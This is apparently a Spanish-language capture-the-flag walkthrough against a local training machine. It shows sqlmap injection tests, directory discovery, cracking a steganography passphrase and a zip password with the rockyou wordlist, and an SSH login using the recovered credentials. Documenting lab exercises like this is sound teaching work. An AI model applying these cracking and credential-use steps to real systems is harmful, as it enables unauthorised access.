[14:45:53] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:46:19] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:46:39] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:47:04] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[14:47:24] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[14:47:47] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[14:48:07] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[14:48:44] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'

```

> Se ejecutaron múltiples técnicas avanzadas de inyección (boolean-based blind), tanto genéricas como específicas de motores de bases de datos, y luego de un rato de espera descartamos vulnerabilidades.

> En este punto, analizando el parámetro city, e intentando hacer distintos tipos de inyección y pruebas de envío notamos que el valor **"city"** es un valor **REFLEJADO** y **NO PROCESADO** por el servidor.

------

## *A partir de este punto, la solución a la máquina sigue como se espera, aunque en un entorno Real... ¿Habría motivos para probar ingresar a la página por un directorio nombrado como algún usuario (directoriotravieso) ?*

------

## Probamos si "directoriotravieso" es un directorio en la url

```bash
curl -i http://172.17.0.2:80/directoriotravieso/
```

```
HTTP/1.1 200 OK
Date: Fri, 11 Jul 2025 19:58:58 GMT
Server: Apache/2.4.61 (Debian)
Vary: Accept-Encoding
Content-Length: 971
Content-Type: text/html;charset=UTF-8

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /directoriotravieso</title>
 </head>
 <body>
<h1>Index of /directoriotravieso</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="miramebien.jpg">miramebien.jpg</a></td><td align="right">2024-08-10 19:53  </td><td align="right">6.2K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.61 (Debian) Server at 172.17.0.2 Port 80</address>
</body></html>
```

> Dentro contiene una imagen con un nombre llamativo "miramebien.jpg".
>

## Nos copiamos la imagen

```bash
curl -o miramebien.jpg http://172.17.0.2/directoriotravieso/miramebien.jpg
```

```
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6324  100  6324    0     0  12.3M      0 --:--:-- --:--:-- --:--:-- 6175k
```

## Analizamos los Metadatos de la imagen

```shell
exiftool miramebien.jpg 
```

```bash
ExifTool Version Number         : 13.30
File Name                       : miramebien.jpg
Directory                       : .
File Size                       : 6.3 kB
File Modification Date/Time     : 2025:07:07 22:21:38-05:00
File Access Date/Time           : 2025:07:07 22:21:38-05:00
File Inode Change Date/Time     : 2025:07:07 22:21:38-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 243
Image Height                    : 207
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 243x207
Megapixels                      : 0.050
```

## Analizamos la imagen por Esteganografía

```bash
steghide extract -sf miramebien.jpg
```

> **Al ejecutar el comando nos pide contraseña (Passphrease) por lo que debemos usar otra herramienta.**

## Debido a la Passpgrase que nos pide para hacer Esteganografía...

## Primero debemos tener un diccionario de contraseñas para intentar vulnerar la imagen y extraer sus datos

```
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

## Extraer datos de la imagen con fuerza usando el diccionario "rockyou.txt" y la herramienta de esteganografía "stegseek"

```
stegseek --crack miramebien.jpg rockyou.txt
```

```
[i] Found passphrase: "chocolate"
[i] Original filename: "ocultito.zip".
[i] Extracting to "miramebien.jpg.out".
```

## Validamos qué el type del archivo

```bash
file miramebien.jpg.out
```

```bash
miramebien.jpg.out: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified, last modified Sun, Aug 10 2024 19:43:52, uncompressed size 16, method=store
```

## Ahora sabemos el archivo descargado es un zip, y lo podemos descomprimir

```bash
unzip miramebien.jpg.out
```

> Al intentar descomprimir nos pide una contraseña
>

## Necesitamos averiguar la contraseña antes de descomprimir el archivo, esto lo haremos con la herramienta "fcrackzip"

- -v : Verbose mode.
- -u : Usa pruebas de descompresión para validar si la contraseña funciona.
- -D : Indica que usará un diccionario de contraseñas en lugar de fuerza bruta.
- -p : Para usar el diccionario indicado.

```bash
fcrackzip -v -u -D -p rockyou.txt miramebien.jpg.out
```

```bash
found file 'secret.txt', (size cp/uc     28/    16, flags 9, chk 9d7a)


PASSWORD FOUND!!!!: pw == stupid1
```

> Al descomprimir el archivo nuevamente usando unzip con la contraseña "stupid1" nos deja un archivo **secret.txt**
>

## Ver el contenido del archivo "secret.txt"

```bash
cat secret.txt
```

```bash
carlos:carlitos
```

## Ya que estamos en una máquina de entrenamiento, suponemos que estos datos pertenecen a la conexión con la máquina por ssh

```bash
ssh carlos@172.17.0.2
```

```bash
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:bjdr2CPYHlTnvte+ZhAXAjTvlpsDOicCzoPPqDqG7HQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
carlos@172.17.0.2's password: 
Linux d783ae2e7f36 6.1.4-arch1-1 #1 SMP PREEMPT_DYNAMIC Sat, 07 Jan 2023 15:10:07 +0000 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 10 19:44:14 2024 from 172.17.0.1
carlos@d783ae2e7f36:~$ 
```